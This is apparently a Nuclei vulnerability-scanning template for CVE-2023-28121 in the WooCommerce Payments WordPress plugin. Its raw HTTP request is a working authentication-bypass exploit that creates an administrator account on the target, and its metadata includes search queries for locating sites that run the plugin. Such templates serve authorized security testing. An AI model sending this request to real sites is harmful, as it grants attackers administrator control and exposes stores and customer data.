http:
- extractors:
  - dsl:
    - '"WP_USERNAME: "+ username'
    - '"WP_PASSWORD: "+ password'
    type: dsl
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"registered_date":'
    - '"username":'
    - '"email":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 201
    type: status
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    X-WCPAY-PLATFORM-CHECKOUT-USER: 1

    Content-Type: application/x-www-form-urlencoded


    rest_route=%2Fwp%2Fv2%2Fusers&username={{username}}&email={{email}}&password={{password}}&roles=administrator

    '
id: CVE-2023-28121
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:automattic:woocommerce_payments:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-28121
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.97799
    epss-score: 0.71629
  description: 'An issue in WooCommerce Payments plugin for WordPress (versions 5.6.1
    and lower) allows an unauthenticated attacker to send requests on behalf of an
    elevated user, like administrator. This allows a remote, unauthenticated attacker
    to gain admin access on a site that has the affected version of the plugin activated.

    '
  impact: 'An attacker can gain unauthorized access to the WooCommerce Payments admin
    panel, potentially leading to data theft or modification.

    '
  metadata:
    framework: wordpress
    google-query: inurl:/wp-content/plugins/woocommerce-payments
    max-request: 1
    product: woocommerce_payments
    publicwww-query: /wp-content/plugins/woocommerce-payments
    vendor: automattic
    verified: true
  name: WooCommerce Payments - Unauthorized Admin Access
  reference:
  - https://github.com/gbrsh/CVE-2023-28121
  - https://nvd.nist.gov/vuln/detail/CVE-2023-28121
  - https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/
  - https://woocommerce.com/products/woocommerce-payments/
  - https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/
  remediation: 'Update to the latest version of the WooCommerce Payments plugin to
    fix the vulnerability.

    '
  severity: critical
  tags: cve2023,cve,wordpress,wp,wp-plugin,auth-bypass,intrusive,automattic
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  password: '{{rand_base(8)}}'
  username: '{{rand_base(6)}}'
